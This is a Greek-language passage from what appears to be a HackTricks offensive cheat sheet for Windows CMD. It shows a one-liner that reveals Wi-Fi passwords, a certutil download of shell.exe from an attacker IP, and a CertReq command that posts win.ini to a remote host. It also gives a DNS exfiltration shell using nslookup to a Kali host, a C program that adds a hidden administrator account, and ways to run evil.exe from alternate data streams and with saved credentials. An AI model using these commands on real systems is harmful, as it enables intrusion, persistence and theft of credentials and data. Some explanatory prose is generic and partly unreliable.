Οι κοινοποιήσεις αναφέρονται στους κοινόχρηστους φακέλους και τους κοινόχρηστους εκτυπωτές που είναι διαθέσιμοι σε ένα σύστημα. Οι κοινόχρηστοι φάκελοι επιτρέπουν σε πολλούς χρήστες να αποκτήσουν πρόσβαση και να μοιραστούν αρχεία σε ένα δίκτυο. Οι κοινόχρηστοι εκτυπωτές επιτρέπουν σε πολλούς χρήστες να εκτυπώνουν από έναν κοινό εκτυπωτή.

Για να εμφανίσετε τις κοινοποιήσεις σε ένα σύστημα Windows, μπορείτε να χρησιμοποιήσετε την εντολή `net share`. Αυτή η εντολή θα εμφανίσει τη λίστα των κοινοποιήσεων, καθώς και τα ονόματα και τα μονοπάτια των κοινόχρηστων φακέλων και εκτυπωτών.

Για να δημιουργήσετε μια νέα κοινοποίηση, μπορείτε να χρησιμοποιήσετε την εντολή `net share <όνομα_κοινοποίησης>=<μονοπάτι_φακέλου>`. Αυτή η εντολή θα δημιουργήσει μια νέα κοινοποίηση με το όνομα που καθορίζετε και το μονοπάτι του φακέλου που θέλετε να κοινοποιήσετε.

Για να καταργήσετε μια κοινοποίηση, μπορείτε να χρησιμοποιήσετε την εντολή `net share <όνομα_κοινοποίησης> /delete`. Αυτή η εντολή θα καταργήσει την κοινοποίηση με το όνομα που καθορίζετε.

Είναι σημαντικό να ελέγχετε τις κοινοποιήσεις σε ένα σύστημα Windows για πιθανές ευπάθειες ασφαλείας, καθώς μπορεί να παρέχουν πρόσβαση σε ευαίσθητα δεδομένα.

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

#### Wifi

Το Wifi είναι μια ασύρματη τεχνολογία δικτύωσης που επιτρέπει στις συσκευές να συνδεθούν σε ένα δίκτυο χρησιμοποιώντας ραδιοκύματα. Είναι ένα δημοφιλές μέσο για τη σύνδεση συσκευών στο διαδίκτυο και την ανταλλαγή δεδομένων. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν το Wifi για να αποκτήσουν πρόσβαση σε ευαίσθητες πληροφορίες ή να παρακολουθήσουν την κίνηση των δεδομένων. Για να προστατεύσετε το δίκτυό σας, μπορείτε να χρησιμοποιήσετε κρυπτογράφηση, ισχυρά κωδικούς πρόσβασης και άλλες μεθόδους ασφαλείας.

```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```

#### SNMP

Το SNMP (Simple Network Management Protocol) είναι ένα πρωτόκολλο δικτύου που χρησιμοποιείται για τη διαχείριση και παρακολούθηση συσκευών σε ένα δίκτυο. Με το SNMP, μπορείτε να λαμβάνετε πληροφορίες σχετικά με την κατάσταση και την απόδοση των δικτυακών συσκευών, καθώς και να διαμορφώνετε και να ελέγχετε αυτές τις συσκευές απομακρυσμένα.

Οι επιθέσεις SNMP μπορούν να περιλαμβάνουν την ανάκτηση πληροφοριών από τις συσκευές, την τροποποίηση των ρυθμίσεων των συσκευών ή ακόμη και την αποκάλυψη ευαίσθητων πληροφοριών. Για να εκμεταλλευτείτε το SNMP, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το `snmpwalk` για να ανακτήσετε πληροφορίες από μια συσκευή, ή το `snmpset` για να τροποποιήσετε τις ρυθμίσεις της.

Για να προστατεύσετε το δίκτυό σας από επιθέσεις SNMP, μπορείτε να εφαρμόσετε τις παρακάτω βασικές πρακτικές ασφαλείας:

* Απενεργοποιήστε το SNMP εάν δεν το χρειάζεστε.
* Χρησιμοποιήστε ισχυρές κωδικοποιήσεις κοινότητας (community strings) για την πρόσβαση στις συσκευές SNMP.
* Περιορίστε την πρόσβαση στο SNMP μόνο από εξουσιοδοτημένες διευθύνσεις IP.
* Ενημερώστε το λογισμικό των συσκευών σας με τις τελευταίες ενημερώσεις ασφαλείας.
* Εφαρμόστε την ασφάλεια σε επίπεδο δικτύου, όπως τη χρήση VPN για ασφαλή απομακρυσμένη πρόσβαση στις συσκευές SNMP.

Ακολουθώντας αυτές τις βασικές πρακτικές ασφαλείας, μπορείτε να μειώσετε τον κίνδυνο επιθέσεων SNMP και να προστατεύσετε το δίκτυό σας από ανεπιθύμητη παρέμβαση.

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

#### Διεπαφές Δικτύου

Οι διεπαφές δικτύου αναφέρονται στα φυσικά ή εικονικά μέσα επικοινωνίας που χρησιμοποιούνται για τη σύνδεση με το δίκτυο. Οι διεπαφές δικτύου μπορεί να είναι ενσύρματες ή ασύρματες και παρέχουν τη δυνατότητα αποστολής και λήψης δεδομένων μέσω του δικτύου.

Για να εμφανίσετε τις διαθέσιμες διεπαφές δικτύου στο σύστημα σας, μπορείτε να χρησιμοποιήσετε την εντολή `ipconfig` στο παράθυρο εντολών. Η εντολή αυτή θα εμφανίσει μια λίστα με όλες τις διεπαφές δικτύου που είναι εγκατεστημένες στο σύστημά σας, συμπεριλαμβανομένων των διεπαφών Ethernet, Wi-Fi και Bluetooth.

Για να εμφανίσετε περισσότερες πληροφορίες για μια συγκεκριμένη διεπαφή δικτύου, μπορείτε να χρησιμοποιήσετε την εντολή `ipconfig /all`. Αυτή η εντολή θα εμφανίσει λεπτομερείς πληροφορίες για τη συγκεκριμένη διεπαφή, όπως η διεύθυνση IP, η διεύθυνση MAC, ο προεπιλεγμένος πύλη και ο DNS διακομιστής.

Επιπλέον, μπορείτε να χρησιμοποιήσετε την εντολή `netsh interface show interface` για να εμφανίσετε μια λίστα με όλες τις διεπαφές δικτύου και την κατάστασή τους, όπως εάν είναι ενεργοποιημένες ή απενεργοποιημένες.

Αυτές οι εντολές είναι χρήσιμες για την ανάλυση των διεπαφών δικτύου στο σύστημά σας και την επιβεβαίωση της σωστής λειτουργίας τους.

```bash
ipconfig /all
```

#### Πίνακας ARP

Ο πίνακας ARP (Address Resolution Protocol) αντιστοιχεί τις διευθύνσεις IP σε φυσικές διευθύνσεις MAC σε ένα δίκτυο. Ο πίνακας ARP αποθηκεύεται στη μνήμη του υπολογιστή και χρησιμοποιείται για την αναζήτηση της φυσικής διεύθυνσης ενός συσκευής με βάση την IP διεύθυνσή της. Αυτό επιτρέπει την αποστολή πακέτων δεδομένων στη σωστή συσκευή στο δίκτυο.

Για να εμφανίσετε τον πίνακα ARP σε ένα σύστημα Windows, μπορείτε να χρησιμοποιήσετε την εντολή `arp -a` στο παράθυρο εντολών (Command Prompt). Αυτή η εντολή θα εμφανίσει τις εγγραφές του πίνακα ARP, που περιλαμβάνουν τις IP διευθύνσεις και τις αντίστοιχες φυσικές διευθύνσεις MAC των συσκευών στο δίκτυο.

```bash
arp -A
```

### Λήψη

Bitsadmin.exe

```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```

## CertReq.exe

Το `CertReq.exe` είναι ένα εργαλείο γραμμής εντολών που χρησιμοποιείται για τη διαχείριση πιστοποιητικών στα Windows. Με αυτό το εργαλείο, μπορείτε να δημιουργήσετε, να εκδώσετε, να επανακτήσετε και να ανανεώσετε πιστοποιητικά.

### Σύνταξη

```
CertReq -?
CertReq -new <RequestFile> <CertFile>
CertReq -retrieve <RequestID> <CertFile>
CertReq -accept <CertFile>
CertReq -submit <RequestFile> <CertFile>
CertReq -sign <RequestFile> <CertFile>
CertReq -policy <PolicyFile> <RequestFile> <CertFile>
CertReq -dump <RequestFile>
CertReq -attrib <RequestFile> <CertFile>
CertReq -delete <RequestID>
CertReq -config <ConfigFile>
CertReq -ping
```

### Παραδείγματα

#### Δημιουργία αιτήματος πιστοποιητικού

```
CertReq -new C:\path\to\request.inf C:\path\to\certificate.cer
```

#### Ανάκτηση πιστοποιητικού

```
CertReq -retrieve <RequestID> C:\path\to\certificate.cer
```

#### Αποδοχή πιστοποιητικού

```
CertReq -accept C:\path\to\certificate.cer
```

#### Υποβολή αιτήματος πιστοποιητικού

```
CertReq -submit C:\path\to\request.inf C:\path\to\certificate.cer
```

#### Υπογραφή αιτήματος πιστοποιητικού

```
CertReq -sign C:\path\to\request.inf C:\path\to\certificate.cer
```

#### Εφαρμογή πολιτικής σε αίτημα πιστοποιητικού

```
CertReq -policy C:\path\to\policy.inf C:\path\to\request.inf C:\path\to\certificate.cer
```

#### Εμφάνιση πληροφοριών αιτήματος πιστοποιητικού

```
CertReq -dump C:\path\to\request.inf
```

#### Προσθήκη χαρακτηριστικών σε αίτημα πιστοποιητικού

```
CertReq -attrib C:\path\to\request.inf C:\path\to\certificate.cer
```

#### Διαγραφή αιτήματος πιστοποιητικού

```
CertReq -delete <RequestID>
```

#### Ρύθμιση αρχείου διαμόρφωσης

```
CertReq -config C:\path\to\config.inf
```

#### Έλεγχος σύνδεσης με τον υπολογιστή πιστοποίησης

```
CertReq -ping
```

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

## Certutil.exe

Το `certutil.exe` είναι ένα εργαλείο της γραμμής εντολών που παρέχεται από τα Windows για τη διαχείριση πιστοποιητικών και κλειδιών. Μπορεί να χρησιμοποιηθεί για διάφορες λειτουργίες, όπως η εγκατάσταση, η εξαγωγή και ο έλεγχος πιστοποιητικών.

### Σύνταξη

```plaintext
certutil [options] [arguments]
```

### Χρήση

Ορισμένες από τις κύριες λειτουργίες του `certutil.exe` περιλαμβάνουν:

*   Εγκατάσταση πιστοποιητικού από αρχείο:

    ```plaintext
    certutil -addstore <store> <certificate_file>
    ```
*   Εξαγωγή πιστοποιητικού σε αρχείο:

    ```plaintext
    certutil -exportcert -f <certificate_serial_number> <output_file>
    ```
*   Εμφάνιση πληροφοριών πιστοποιητικού:

    ```plaintext
    certutil -dump <certificate_file>
    ```
*   Εμφάνιση πιστοποιητικών σε ένα κατάστημα:

    ```plaintext
    certutil -store <store>
    ```
*   Διαγραφή πιστοποιητικού από ένα κατάστημα:

    ```plaintext
    certutil -delstore <store> <certificate_serial_number>
    ```

Αυτές είναι μερικές από τις βασικές εντολές που μπορείτε να χρησιμοποιήσετε με το `certutil.exe`. Μπορείτε να βρείτε περισσότερες πληροφορίες και επιλογές εντολής στην τεκμηρίωση των Windows.

```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```

**Βρείτε περισσότερα αναζητώντας το `Download` στη διεύθυνση** [**https://lolbas-project.github.io**](https://lolbas-project.github.io/)

### Διάφορα

```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```

#### Παράκαμψη Αποτροπής Μαύρης Λίστας Χαρακτήρων

Όταν αντιμετωπίζετε έναν περιορισμό στην εισαγωγή συγκεκριμένων χαρακτήρων σε μια εφαρμογή, μπορείτε να χρησιμοποιήσετε την τεχνική της παράκαμψης της μαύρης λίστας χαρακτήρων για να παρακάμψετε αυτόν τον περιορισμό. Αντί να χρησιμοποιήσετε τους αποκλεισμένους χαρακτήρες, μπορείτε να χρησιμοποιήσετε αντίστοιχους χαρακτήρες που δεν βρίσκονται στη μαύρη λίστα.

Για παράδειγμα, αν ένας χαρακτήρας όπως το `;` απαγορεύεται, μπορείτε να χρησιμοποιήσετε τον χαρακτήρα `；` που μοιάζει παρόμοιος αλλά δεν ανιχνεύεται από τον περιορισμό. Με αυτόν τον τρόπο, μπορείτε να παρακάμψετε την αποτροπή και να εισάγετε τον απαγορευμένο χαρακτήρα στην εφαρμογή.

Είναι σημαντικό να ελέγχετε προσεκτικά τη μαύρη λίστα χαρακτήρων και να βρίσκετε αντίστοιχους χαρακτήρες που μπορούν να παρακαμφθούν. Επίσης, να λαμβάνετε υπόψη τις πιθανές επιπτώσεις της παράκαμψης της μαύρης λίστας χαρακτήρων, καθώς μπορεί να υπάρχει κίνδυνος ασφαλείας ή παραβίασης του συστήματος.

```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```

#### DOSfuscation

Δημιουργεί ένα αποκρυπτογραφημένο CMD γραμμής εντολών

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```

#### Λίστα ACL διευθύνσεων ακρόασης

Μπορείτε να ακούσετε στη διεύθυνση [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/) χωρίς να είστε διαχειριστής.

```bash
netsh http show urlacl
```

#### Εγχειρίδιο χειροκίνητου DNS shell

**Ο Επιτιθέμενος** (Kali) πρέπει να χρησιμοποιήσει μία από αυτές τις 2 επιλογές:

```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```

**Θύμα**

Τεχνική **`for /f tokens`**: Αυτό μας επιτρέπει να εκτελέσουμε εντολές, να πάρουμε τις πρώτες X λέξεις από κάθε γραμμή και να τις στείλουμε μέσω DNS στον διακομιστή μας.

```bash
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```

Μπορείτε επίσης να **ανακατευθύνετε** την έξοδο και στη συνέχεια να την **διαβάσετε**.

```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```

### Κλήση του CMD από τον κώδικα C

Για να καλέσετε το CMD από τον κώδικα C, μπορείτε να χρησιμοποιήσετε τη συνάρτηση `system()`. Η συνάρτηση `system()` εκτελεί μια εντολή στο CMD και περιμένει μέχρι να ολοκληρωθεί η εκτέλεσή της.

Παρακάτω παρουσιάζεται ένα παράδειγμα κώδικα C που καλεί το CMD και εκτελεί την εντολή `ipconfig`:

```c
#include <stdlib.h>

int main() {
    system("cmd /c ipconfig");
    return 0;
}
```

Στο παραπάνω παράδειγμα, η εντολή `cmd /c` χρησιμοποιείται για να εκτελέσει την εντολή `ipconfig` στο CMD. Μπορείτε να αντικαταστήσετε την εντολή `ipconfig` με οποιαδήποτε άλλη εντολή CMD που θέλετε να εκτελέσετε.

Όταν εκτελέσετε τον παραπάνω κώδικα C, θα εμφανιστούν τα αποτελέσματα της εντολής `ipconfig` στο CMD.

```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
int i;
i=system("net users otherAcc 0TherAcc! /add");
i=system("net localgroup administrators otherAcc /add");
return 0;
}
```

### Συνοπτικό φύλλο με Εναλλακτικά Ρεύματα Δεδομένων (ADS/Alternate Data Stream)

**Παραδείγματα που έχουν ληφθεί από το** [**https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f**](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)**. Υπάρχουν πολλά περισσότερα εκεί!**

```bash
## Selected Examples of ADS Operations ##

### Adding Content to ADS ###
# Append executable to a log file as an ADS
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
# Download a script directly into an ADS
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

### Discovering ADS Content ###
# List files and their ADS
dir /R
# Use Sysinternals tool to list ADS of a file
streams.exe <c:\path\to\file>

### Extracting Content from ADS ###
# Extract an executable stored in an ADS
expand c:\ads\file.txt:test.exe c:\temp\evil.exe

### Executing ADS Content ###
# Execute an executable stored in an ADS using WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
# Execute a script stored in an ADS using PowerShell
powershell -ep bypass - < c:\temp:ttt
```

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
